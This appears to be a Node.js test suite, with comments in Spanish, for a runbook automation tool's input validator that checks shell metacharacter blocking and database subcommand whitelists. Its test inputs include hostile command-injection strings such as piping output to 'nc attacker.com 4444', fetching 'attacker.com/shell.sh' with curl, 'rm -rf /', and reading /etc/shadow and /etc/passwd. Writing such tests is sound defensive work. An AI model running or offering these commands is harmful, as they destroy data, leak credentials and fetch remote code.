'use strict';

// ═══════════════════════════════════════════════════════════════
//  Tests — Input Validator (Fase 1B: whitelist + sanitizacion)
//  Ejecutar: node tests/input-validator.test.js
// ═══════════════════════════════════════════════════════════════

const assert = require('assert');
const {
  safeParse,
  sanitizeSid,
  sanitizeFunctionName,
  sanitizeInstanceId,
  sanitizeDbSubcommand,
  sanitizeRunbookCommands,
  ALLOWED_DB_SUBCOMMANDS,
} = require('../lambda/utilidades/input-validator');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    passed++;
    console.log(`  ✓ ${name}`);
  } catch (e) {
    failed++;
    console.log(`  ✗ ${name}`);
    console.log(`    ${e.message}`);
  }
}

console.log('\n=== Input Validator Tests ===\n');

// ─── safeParse ───
console.log('safeParse:');

test('parsea JSON valido', () => {
  const result = safeParse('{"key": "value"}');
  assert.deepStrictEqual(result, { key: 'value' });
});

test('retorna null para JSON invalido', () => {
  assert.strictEqual(safeParse('not json'), null);
});

test('retorna null para null', () => {
  assert.strictEqual(safeParse(null), null);
});

test('retorna objeto si ya es objeto', () => {
  const obj = { a: 1 };
  assert.strictEqual(safeParse(obj), obj);
});

// ─── sanitizeSid ───
console.log('\nsanitizeSid:');

test('acepta SID valido (3 caracteres)', () => {
  assert.strictEqual(sanitizeSid('OMP'), 'OMP');
  assert.strictEqual(sanitizeSid('S4H'), 'S4H');
});

test('convierte a mayusculas', () => {
  assert.strictEqual(sanitizeSid('omp'), 'OMP');
});

test('rechaza SID con metacaracteres shell', () => {
  assert.throws(() => sanitizeSid('O;M'), /invalido/);
  assert.throws(() => sanitizeSid('O|P'), /invalido/);
  assert.throws(() => sanitizeSid('$(x'), /invalido/);
});

test('rechaza SID de longitud incorrecta', () => {
  assert.throws(() => sanitizeSid('AB'), /invalido/);
  assert.throws(() => sanitizeSid('ABCD'), /invalido/);
  assert.throws(() => sanitizeSid(''), /requerido/);
});

// ─── sanitizeDbSubcommand con whitelist ───
console.log('\nsanitizeDbSubcommand (whitelist):');

test('acepta subcomando en whitelist del runbook', () => {
  const result = sanitizeDbSubcommand('dump tran OMP with truncate_only', 'RB-ASE-001');
  assert.strictEqual(result, 'dump tran OMP with truncate_only');
});

test('rechaza subcomando fuera de whitelist', () => {
  assert.throws(
    () => sanitizeDbSubcommand('DROP TABLE users', 'RB-ASE-001'),
    /no permitido/
  );
});

test('acepta SELECT para HANA', () => {
  const result = sanitizeDbSubcommand('SELECT TOP 5 * FROM M_BACKUP_CATALOG', 'RB-HANA-001');
  assert.strictEqual(typeof result, 'string');
});

test('rechaza ALTER para ASE (no en whitelist)', () => {
  assert.throws(
    () => sanitizeDbSubcommand('ALTER TABLE test DROP COLUMN x', 'RB-ASE-001'),
    /no permitido/
  );
});

// ─── sanitizeDbSubcommand sin runbook (fallback blacklist) ───
console.log('\nsanitizeDbSubcommand (fallback blacklist):');

test('rechaza metacaracteres shell en fallback', () => {
  assert.throws(() => sanitizeDbSubcommand('cmd; rm -rf /'), /prohibidos/);
  assert.throws(() => sanitizeDbSubcommand('cmd | cat /etc/passwd'), /prohibidos/);
  assert.throws(() => sanitizeDbSubcommand('cmd && malicious'), /prohibidos/);
  assert.throws(() => sanitizeDbSubcommand('$(evil)'), /prohibidos/);
  assert.throws(() => sanitizeDbSubcommand('cmd`evil`more'), /prohibidos/);
});

test('rechaza saltos de linea (inyeccion multi-linea)', () => {
  assert.throws(
    () => sanitizeDbSubcommand('cmd\nrm -rf /'),
    /saltos de linea/
  );
});

test('acepta subcomando multi-linea via whitelist (SQL blocks)', () => {
  // Los heredocs (<<EOSQL) se generan en aseIsqlCmd, no pasan por sanitize.
  // El subcomando SQL si puede tener saltos de linea cuando va por whitelist.
  const result = sanitizeDbSubcommand('SELECT spid, starttime FROM master..sysprocesses\nWHERE spid > 0', 'RB-ASE-001');
  assert.strictEqual(typeof result, 'string');
});

test('acepta comando simple sin runbook', () => {
  const result = sanitizeDbSubcommand('db_state');
  assert.strictEqual(result, 'db_state');
});

// ─── sanitizeRunbookCommands ───
console.log('\nsanitizeRunbookCommands:');

test('acepta array de comandos validos', () => {
  const cmds = ['echo "test"', 'sapcontrol -nr 00 -function GetProcessList'];
  const result = sanitizeRunbookCommands(cmds, 'RB-TEST-001');
  assert.deepStrictEqual(result, cmds);
});

test('rechaza comandos con backticks', () => {
  assert.throws(
    () => sanitizeRunbookCommands(['echo `whoami`'], 'RB-TEST-001'),
    /metacaracteres/
  );
});

test('rechaza comandos con $() subshell', () => {
  assert.throws(
    () => sanitizeRunbookCommands(['echo $(cat /etc/passwd)'], 'RB-TEST-001'),
    /metacaracteres/
  );
});

test('rechaza comandos con || (pipe logico)', () => {
  assert.throws(
    () => sanitizeRunbookCommands(['false || rm -rf /'], 'RB-TEST-001'),
    /metacaracteres/
  );
});

test('rechaza si no es array', () => {
  assert.throws(() => sanitizeRunbookCommands('not array', 'RB-TEST'), /array/);
});

test('rechaza sin runbookId', () => {
  assert.throws(() => sanitizeRunbookCommands([], ''), /requerido/);
});

// ─── ALLOWED_DB_SUBCOMMANDS exportada ───
console.log('\nWhitelist exportada:');

test('ALLOWED_DB_SUBCOMMANDS tiene entradas para runbooks conocidos', () => {
  assert.ok(ALLOWED_DB_SUBCOMMANDS['RB-ASE-001'], 'RB-ASE-001 debe tener whitelist');
  assert.ok(ALLOWED_DB_SUBCOMMANDS['RB-HANA-001'], 'RB-HANA-001 debe tener whitelist');
  assert.ok(Array.isArray(ALLOWED_DB_SUBCOMMANDS['RB-ASE-001']));
});

// ─── Ataques de inyeccion conocidos ───
console.log('\nAtaques de inyeccion:');

test('bloquea inyeccion clasica con punto y coma', () => {
  assert.throws(() => sanitizeDbSubcommand('db_state; cat /etc/shadow'), /prohibidos/);
});

test('bloquea inyeccion con pipe', () => {
  assert.throws(() => sanitizeDbSubcommand('info | nc attacker.com 4444'), /prohibidos/);
});

test('bloquea command substitution', () => {
  assert.throws(() => sanitizeDbSubcommand('$(curl attacker.com/shell.sh)'), /prohibidos/);
});

test('bloquea backtick substitution', () => {
  assert.throws(() => sanitizeDbSubcommand('`curl attacker.com`'), /prohibidos/);
});

// ─── Resultados ───
console.log(`\nResults: ${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
